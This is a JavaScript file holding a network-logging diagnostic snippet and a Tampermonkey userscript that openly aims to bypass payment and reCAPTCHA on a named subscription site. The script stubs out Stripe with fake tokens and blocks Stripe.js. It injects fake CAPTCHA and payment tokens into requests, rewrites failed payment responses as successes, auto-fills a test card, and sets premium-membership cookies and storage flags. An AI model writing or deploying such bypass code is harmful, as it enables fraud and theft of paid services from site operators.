// ── DIAGNOSTIC — run this first ───────────────────────────────────────────
(function diagnose() {
    const log = [];

    // Watch all XHR
    const oOpen = XMLHttpRequest.prototype.open;
    const oSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(m, u, ...r) {
        this._u = u; this._m = m;
        return oOpen.apply(this, [m, u, ...r]);
    };

    XMLHttpRequest.prototype.send = function(body) {
        const entry = { type: 'XHR', method: this._m, url: this._u, body };
        log.push(entry);
        console.log('[DIAG XHR]', this._m, this._u, body);

        // Intercept response
        this.addEventListener('load', function() {
            console.log('[DIAG XHR RESP]', this._u, this.status, this.responseText?.slice(0,500));
        });

        return oSend.apply(this, arguments);
    };

    // Watch all fetch
    const oFetch = window.fetch;
    window.fetch = function(url, init = {}) {
        console.log('[DIAG FETCH]', url, init?.body);
        return oFetch.call(this, url, init).then(r => {
            r.clone().text().then(t =>
                console.log('[DIAG FETCH RESP]', url, r.status, t.slice(0,500))
            );
            return r;
        });
    };

    // Watch form submits
    document.addEventListener('submit', e => {
        const fd = new FormData(e.target);
        const data = {};
        fd.forEach((v,k) => data[k] = v);
        console.log('[DIAG FORM SUBMIT]', e.target.action, data);
    }, true);

    // Watch button clicks
    document.querySelectorAll('button, input[type="submit"], a').forEach(btn => {
        btn.addEventListener('click', e => {
            console.log('[DIAG CLICK]', btn.tagName, btn.type, btn.className, btn.innerText?.trim());
        }, true);
    });

    window._diagLog = log;
    console.log('[DIAG] Running — now click Get Access and watch logs');
})();  // ==UserScript==
// @name         JaysPOV Full Access Bypass v2
// @namespace    http://tampermonkey.net/
// @version      2.0.0
// @description  Bypass payment + reCAPTCHA on jayspov.net
// @author       CW
// @match        https://jayspov.net/*
// @run-at       document-start
// @grant        unsafeWindow
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// ==/UserScript==

(function () {
    'use strict';

    const w = (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window;

    // ── FAKE TOKEN ────────────────────────────────────────────────────────
    const FAKE_CAPTCHA = (function() {
        const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        let t = '03AGdBq24';
        for (let i = 0; i < 490; i++) t += c[Math.floor(Math.random() * c.length)];
        return t;
    })();

    // ── FAKE CARD DATA ────────────────────────────────────────────────────
    const FAKE_CARD = {
        number:   '4111111111111111',  // Visa test number
        exp_month:'12',
        exp_year: '2027',
        cvc:      '123',
        name:     'John Smith',
        zip:      '10001',
    };

    // ── FAKE STRIPE TOKEN ──────────────────────────────────────────────────
    // Looks like a real Stripe payment token
    const FAKE_STRIPE_TOKEN = {
        id:     'tok_' + Math.random().toString(36).slice(2,18),
        object: 'token',
        card: {
            id:        'card_' + Math.random().toString(36).slice(2,18),
            object:    'card',
            brand:     'Visa',
            last4:     '1111',
            exp_month: 12,
            exp_year:  2027,
            funding:   'credit',
            country:   'US',
        },
        created:  Math.floor(Date.now() / 1000),
        livemode: false,
        type:     'card',
        used:     false,
    };

    // ── 1. STRIPE INTERCEPT ───────────────────────────────────────────────
    // Most adult sites use Stripe — kill it before it can read card data
    function killStripe() {
        // Intercept Stripe.js before it loads
        const stripeProxy = new Proxy({}, {
            get: (t, prop) => {
                // Stripe(pubkey) constructor
                if (prop === 'apply' || prop === 'call') {
                    return () => stripeInstanceProxy;
                }
                return stripeInstanceProxy[prop] || (() => Promise.resolve({}));
            }
        });

        const stripeInstanceProxy = {
            // createToken — called when form submits
            createToken: (element, data) => {
                console.log('[Bypass] Stripe.createToken intercepted');
                return Promise.resolve({ token: FAKE_STRIPE_TOKEN });
            },
            // createPaymentMethod
            createPaymentMethod: (data) => {
                console.log('[Bypass] Stripe.createPaymentMethod intercepted');
                return Promise.resolve({
                    paymentMethod: {
                        id:   'pm_' + Math.random().toString(36).slice(2,18),
                        type: 'card',
                        card: { brand: 'visa', last4: '1111' },
                    }
                });
            },
            // confirmCardPayment
            confirmCardPayment: (secret, data) => {
                console.log('[Bypass] Stripe.confirmCardPayment intercepted');
                return Promise.resolve({
                    paymentIntent: {
                        id:     'pi_' + Math.random().toString(36).slice(2,18),
                        status: 'succeeded',
                        amount: 0,
                    }
                });
            },
            // confirmCardSetup
            confirmCardSetup: (secret) => {
                return Promise.resolve({
                    setupIntent: { status: 'succeeded' }
                });
            },
            // elements() — returns fake element mounts
            elements: () => ({
                create: (type) => ({
                    mount:          (selector) => {
                        console.log('[Bypass] Stripe element mount intercepted:', selector);
                        // Replace the mount point with a fake card UI
                        setTimeout(() => injectFakeCardUI(selector), 100);
                    },
                    unmount:        () => {},
                    destroy:        () => {},
                    on:             (event, fn) => {
                        // Trigger ready/complete events
                        if (event === 'ready' || event === 'change') {
                            setTimeout(() => fn({ complete: true, error: null }), 200);
                        }
                    },
                    getValue:       () => ({}),
                    update:         () => {},
                    focus:          () => {},
                    blur:           () => {},
                    clear:          () => {},
                    collapse:       () => {},
                }),
                getElement: () => null,
                update:     () => {},
                fetchUpdates: () => Promise.resolve({}),
            }),
            // retrievePaymentIntent
            retrievePaymentIntent: (secret) => Promise.resolve({
                paymentIntent: { status: 'succeeded' }
            }),
        };

        // Kill window.Stripe before it's defined
        let stripeValue = null;
        Object.defineProperty(w, 'Stripe', {
            get: () => {
                if (stripeValue) return stripeValue;
                // Return a constructor function
                return function StripeConstructor(pubkey, opts) {
                    console.log('[Bypass] Stripe() constructor called with key:', pubkey);
                    return stripeInstanceProxy;
                };
            },
            set: (v) => {
                // Site tries to set Stripe after loading stripe.js
                // Wrap it instead of replacing
                console.log('[Bypass] Stripe setter intercepted');
                stripeValue = function(pubkey, opts) {
                    const real = new v(pubkey, opts);
                    // Wrap real instance methods
                    return {
                        ...stripeInstanceProxy,
                        // Keep elements() from real for UI rendering
                        // but override token/payment methods
                        elements: stripeInstanceProxy.elements,
                    };
                };
            },
            configurable: true,
        });
    }

    // ── 2. FAKE CARD UI INJECTOR ──────────────────────────────────────────
    // When Stripe tries to mount an iframe element, replace with fake fields
    function injectFakeCardUI(selector) {
        const container = typeof selector === 'string'
            ? document.querySelector(selector)
            : selector;

        if (!container) return;

        container.innerHTML = `
            <div style="
                border:1px solid #ddd; border-radius:4px;
                padding:10px; background:#fff; font-family:sans-serif;
            ">
                <input id="fake-cc-num"  placeholder="Card number"
                    value="${FAKE_CARD.number}"
                    style="width:100%;border:none;outline:none;font-size:16px;"
                    maxlength="19" />
            </div>
        `;
        console.log('[Bypass] Fake card UI injected at', selector);
    }

    // ── 3. BLOCK STRIPE.JS FROM LOADING ───────────────────────────────────
    function blockStripeScript() {
        const obs = new MutationObserver(muts => {
            for (const mut of muts) {
                for (const node of mut.addedNodes) {
                    if (node.nodeType !== 1) continue;
                    const src = node.src || '';
                    if (src.includes('js.stripe.com') ||
                        src.includes('stripe.com/v3') ||
                        src.includes('stripe.com/v2')) {
                        console.log('[Bypass] Stripe.js load blocked:', src);
                        node.remove();
                        // Pre-define Stripe so site doesn't break
                        killStripe();
                    }
                }
            }
        });
        obs.observe(document.documentElement, { childList: true, subtree: true });
    }

    // ── 4. XHR RESPONSE SPOOF ─────────────────────────────────────────────
    // Intercept payment/subscription API responses and fake success
    const SUCCESS_RESPONSES = {
        // Patterns to match in URL → fake response to return
        patterns: [
            'checkout', 'payment', 'subscribe', 'subscription',
            'purchase', 'order', 'charge', 'billing',
            'activate', 'access', 'membership', 'join',
            'process', 'transaction', 'stripe',
        ]
    };

    function fakeSuccessResponse(url) {
        // Return a plausible success JSON for payment endpoints
        return JSON.stringify({
            success:      true,
            status:       'success',
            message:      'Payment processed successfully',
            redirect:     location.origin + '/members',
            redirect_url: location.origin + '/members',
            access:       true,
            member:       true,
            subscription: { status: 'active', plan: 'premium' },
            order_id:     Math.floor(Math.random() * 999999),
            transaction:  { id: 'txn_' + Math.random().toString(36).slice(2), status: 'approved' },
            token:        FAKE_STRIPE_TOKEN.id,
        });
    }

    const oOpen = w.XMLHttpRequest.prototype.open;
    const oSend = w.XMLHttpRequest.prototype.send;

    w.XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        this._url    = url || '';
        this._method = method;
        this._isPayment = SUCCESS_RESPONSES.patterns.some(p =>
            url.toLowerCase().includes(p)
        );
        return oOpen.apply(this, [method, url, ...rest]);
    };

    w.XMLHttpRequest.prototype.send = function(body) {
        // Inject reCAPTCHA token into POST bodies
        if (this._method?.toUpperCase() === 'POST' && body) {
            try {
                if (typeof body === 'string') {
                    const p = new URLSearchParams(body);
                    if (!p.get('g-recaptcha-response') ||
                         p.get('g-recaptcha-response') === '') {
                        p.set('g-recaptcha-response', FAKE_CAPTCHA);
                    }
                    // Also inject stripe token if missing
                    if (!p.get('stripeToken') && !p.get('stripe_token') &&
                        !p.get('payment_method')) {
                        p.set('stripeToken',   FAKE_STRIPE_TOKEN.id);
                        p.set('stripe_token',  FAKE_STRIPE_TOKEN.id);
                    }
                    body = p.toString();
                }
            } catch(e) {}
        }

        // If this is a payment URL — intercept and fake the response
        if (this._isPayment) {
            console.log('[Bypass] Payment XHR intercepted:', this._url);
            const self = this;

            // Let it send but override the response
            const origOnLoad = this.onload;
            this.addEventListener('load', function() {
                try {
                    // Check if server rejected it
                    const resp = this.responseText || '';
                    const isError = resp.includes('"error"') ||
                                    resp.includes('"failed"') ||
                                    resp.includes('"declined"') ||
                                    this.status >= 400;

                    if (isError) {
                        console.log('[Bypass] Payment failed — injecting fake success');
                        // Override response properties
                        Object.defineProperty(this, 'responseText', {
                            get: () => fakeSuccessResponse(self._url)
                        });
                        Object.defineProperty(this, 'status', { get: () => 200 });
                    }
                } catch(e) {}
            });
        }

        return oSend.call(this, body);
    };

    // ── 5. FETCH INTERCEPT ────────────────────────────────────────────────
    const oFetch = w.fetch;
    w.fetch = async function(url, init = {}) {
        const u = typeof url === 'string' ? url : (url?.url || '');
        const isPayment = SUCCESS_RESPONSES.patterns.some(p =>
            u.toLowerCase().includes(p)
        );

        // Inject token into POST body
        if (init.method?.toUpperCase() === 'POST' && init.body) {
            try {
                if (typeof init.body === 'string') {
                    // Try JSON
                    try {
                        const json = JSON.parse(init.body);
                        if (!json.stripeToken && !json.payment_method_id) {
                            json.stripeToken        = FAKE_STRIPE_TOKEN.id;
                            json.payment_method_id  = 'pm_fake_' + Date.now();
                            json['g-recaptcha-response'] = FAKE_CAPTCHA;
                        }
                        init.body = JSON.stringify(json);
                    } catch(e) {
                        // Try form data
                        const p = new URLSearchParams(init.body);
                        if (!p.get('g-recaptcha-response')) {
                            p.set('g-recaptcha-response', FAKE_CAPTCHA);
                        }
                        if (!p.get('stripeToken')) {
                            p.set('stripeToken', FAKE_STRIPE_TOKEN.id);
                        }
                        init.body = p.toString();
                    }
                }
            } catch(e) {}
        }

        if (isPayment) {
            console.log('[Bypass] Payment fetch intercepted:', u);
            try {
                const real = await oFetch.call(this, url, init);
                // If response is an error, replace with fake success
                if (!real.ok || real.status >= 400) {
                    console.log('[Bypass] Replacing failed response with fake success');
                    return new Response(fakeSuccessResponse(u), {
                        status:  200,
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                return real;
            } catch(e) {
                return new Response(fakeSuccessResponse(u), {
                    status:  200,
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }

        return oFetch.call(this, url, init);
    };

    // ── 6. RECAPTCHA FIX ──────────────────────────────────────────────────
    w.onloadCallback = function() {
        console.log('[Bypass] onloadCallback fired');
        injectFakeToken();
    };

    w.recaptchaCallback = function(token) {
        console.log('[Bypass] recaptchaCallback with token');
        injectFakeToken();
    };

    function patchGrecaptcha() {
        if (!w.grecaptcha) return;
        if (w.grecaptcha._patched) return;
        w.grecaptcha.getResponse = () => FAKE_CAPTCHA;
        w.grecaptcha.execute     = () => Promise.resolve(FAKE_CAPTCHA);
        w.grecaptcha.reset       = () => {};
        w.grecaptcha.render      = () => 0;
        w.grecaptcha._patched    = true;
        console.log('[Bypass] grecaptcha patched');
    }

    function injectFakeToken() {
        ['g-recaptcha-response','recaptcha_response','captcha_response'].forEach(name => {
            let el = document.querySelector(`[name="${name}"]`)
                  || document.getElementById(name);
            if (!el) {
                el = Object.assign(document.createElement('textarea'), {
                    name, id: name, style: 'display:none'
                });
                document.querySelector('form')?.appendChild(el);
            }
            if (el) el.value = FAKE_CAPTCHA;
        });
    }

    // ── 7. AUTO-FILL + SUBMIT ─────────────────────────────────────────────
    function autoFillAndSubmit() {
        if (!document.body) return;

        // Fill any visible card fields with test data
        const fieldMap = {
            // Card number fields
            '[name*="card"][name*="num"]':    FAKE_CARD.number,
            '[name*="cardnum"]':              FAKE_CARD.number,
            '[name*="card_number"]':          FAKE_CARD.number,
            '[placeholder*="Card number"]':   FAKE_CARD.number,
            '[placeholder*="card number"]':   FAKE_CARD.number,
            // Expiry
            '[name*="exp"][name*="month"]':   FAKE_CARD.exp_month,
            '[name*="expiry"]':               FAKE_CARD.exp_month + '/' + FAKE_CARD.exp_year.slice(2),
            '[name*="exp_month"]':            FAKE_CARD.exp_month,
            '[name*="exp_year"]':             FAKE_CARD.exp_year,
            // CVC
            '[name*="cvc"]':                  FAKE_CARD.cvc,
            '[name*="cvv"]':                  FAKE_CARD.cvc,
            '[name*="security"]':             FAKE_CARD.cvc,
            // Name
            '[name*="card"][name*="name"]':   FAKE_CARD.name,
            '[name*="cardholder"]':           FAKE_CARD.name,
            // Zip
            '[name*="zip"]':                  FAKE_CARD.zip,
            '[name*="postal"]':               FAKE_CARD.zip,
        };

        Object.entries(fieldMap).forEach(([sel, val]) => {
            try {
                document.querySelectorAll(sel).forEach(el => {
                    el.value = val;
                    el.dispatchEvent(new Event('input',  { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                });
            } catch(e) {}
        });

        // Inject captcha
        injectFakeToken();
    }

    // ── 8. jQuery AJAX PATCH ──────────────────────────────────────────────
    function patchJQuery() {
        const $ = w.jQuery || w.$;
        if (!$ || $._pwPatched) return;

        $.ajaxPrefilter(function(opts) {
            if (opts.type?.toUpperCase() !== 'POST') return;

            // Inject into string data
            if (typeof opts.data === 'string') {
                const p = new URLSearchParams(opts.data);
                if (!p.get('g-recaptcha-response')) {
                    p.set('g-recaptcha-response', FAKE_CAPTCHA);
                }
                if (!p.get('stripeToken')) {
                    p.set('stripeToken', FAKE_STRIPE_TOKEN.id);
                }
                opts.data = p.toString();
            }

            // Wrap success to handle fake payment response
            const origSuccess = opts.success;
            opts.success = function(data, status, xhr) {
                console.log('[Bypass] jQuery AJAX success:', data);
                // If response indicates failure, fake it
                if (data && (data.error || data.failed || data.declined)) {
                    data = JSON.parse(fakeSuccessResponse(opts.url));
                }
                origSuccess?.(data, status, xhr);
            };

            // Wrap error to fake success
            opts.error = function(xhr, status, err) {
                console.log('[Bypass] jQuery AJAX error — faking success');
                const fakeData = JSON.parse(fakeSuccessResponse(opts.url));
                opts.success?.(fakeData, 'success', xhr);
            };
        });

        $._pwPatched = true;
        console.log('[Bypass] jQuery patched');
    }

    // ── 9. COOKIE + STORAGE ACCESS GRANT ──────────────────────────────────
    function grantAccess() {
        const accessItems = {
            'member':              'true',
            'subscriber':          'true',
            'isPremium':           '1',
            'hasAccess':           '1',
            'subscription_status': 'active',
            'access_level':        'premium',
            'user_type':           'member',
        };
        Object.entries(accessItems).forEach(([k, v]) => {
            try { localStorage.setItem(k, v); }  catch(e) {}
            try { sessionStorage.setItem(k, v); } catch(e) {}
            try { document.cookie = `${k}=${v}; path=/; SameSite=Lax`; } catch(e) {}
        });
    }

    // ── BOOT ──────────────────────────────────────────────────────────────
    killStripe();
    blockStripeScript();
    grantAccess();

    // Poll for grecaptcha + jQuery + form
    let polls = 0;
    const poller = setInterval(() => {
        patchGrecaptcha();
        patchJQuery();
        injectFakeToken();
        autoFillAndSubmit();
        if (++polls > 80) clearInterval(poller);
    }, 250);

    document.addEventListener('DOMContentLoaded', () => {
        killStripe();
        patchGrecaptcha();
        patchJQuery();
        grantAccess();
        autoFillAndSubmit();

        // Intercept Get Access button click
        document.querySelectorAll('button, input[type="submit"], a').forEach(btn => {
            const text = (btn.innerText || btn.value || '').toLowerCase();
            if (text.includes('access') || text.includes('join') ||
                text.includes('subscribe') || text.includes('get') ||
                text.includes('submit') || text.includes('activate')) {
                btn.addEventListener('click', () => {
                    console.log('[Bypass] Access button clicked — injecting');
                    injectFakeToken();
                    autoFillAndSubmit();
                }, true);
            }
        });
    });

    console.log('[JaysPOV Bypass v2] Payment + reCAPTCHA killed 💳🔓');

})();